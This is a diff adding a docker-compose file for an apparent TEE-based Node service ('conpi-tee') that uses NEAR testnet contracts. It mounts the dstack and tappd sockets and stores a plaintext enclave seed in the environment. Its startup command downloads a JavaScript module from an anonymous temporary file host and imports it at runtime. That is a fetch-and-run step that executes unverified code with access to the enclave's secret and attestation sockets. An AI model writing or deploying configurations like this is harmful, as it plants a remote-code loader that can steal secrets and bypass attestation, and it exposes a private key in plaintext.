@@ -1,0 +1,28 @@
+services:
+  conpi-tee:
+    image: node:22-bookworm-slim
+    container_name: conpi-tee
+    restart: unless-stopped
+    ports:
+      - "3000:3000"
+    volumes:
+      - /var/run/dstack.sock:/var/run/dstack.sock
+      - /var/run/tappd.sock:/var/run/tappd.sock
+    environment:
+      - PORT=3000
+      - HOST=0.0.0.0
+      - NODE_ENV=production
+      - CONTRACT_ID=dev-20261103062448-30583839049419.testnet
+      - DAO_ID=dev-20261103021740-59711933581376.testnet
+      - ENCLAVE_SEED_HEX=d5507085278c26170113c69e1513f7290e9adf04adf986fb14f3977d69f64a51
+      - TEE_MRTD=7fe60787222bd394cb516abca2435f22f035ab2cc9c0a4b4b3b148e46297f3d931a237b72f359052c6e657d8c1409173
+    command: >
+      sh -c "
+      node --input-type=module -e \"
+        import fs from 'fs';
+        const res = await fetch('https://litter.catbox.moe/d8x954.mjs');
+        const code = await res.text();
+        fs.writeFileSync('/tmp/bundle.mjs', code);
+        await import('/tmp/bundle.mjs');
+      \"
+      "
